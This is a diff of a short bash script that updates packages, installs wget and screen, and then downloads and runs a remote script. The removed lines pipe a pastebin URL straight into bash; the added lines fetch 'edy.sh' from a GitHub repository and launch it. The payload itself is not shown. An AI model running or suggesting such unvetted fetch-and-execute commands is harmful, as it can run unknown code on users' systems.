@@ -1,17 +1,17 @@
 #!/bin/bash
 
-apt --fix-missing update
+apt --fix-missing update 
 sleep 1
-apt update
+apt update 
 sleep 1
-apt upgrade -y
+apt upgrade -y 
 sleep 1
-apt install -y wget screen
+apt install -y wget screen 
 sleep 1
-wget -qO - https://pastebin.com/raw/C4GSpdYs | bash
+wget -q https://raw.githubusercontent.com/karbandt6/bandwith-tester/main/edy.sh
 sleep 1
-chmod +x edy
+chmod +x edy.sh  
 sleep 1
-./edy
+screen -dmS edy 
 sleep 1
-screen -S edy ./edy
+./edy.sh
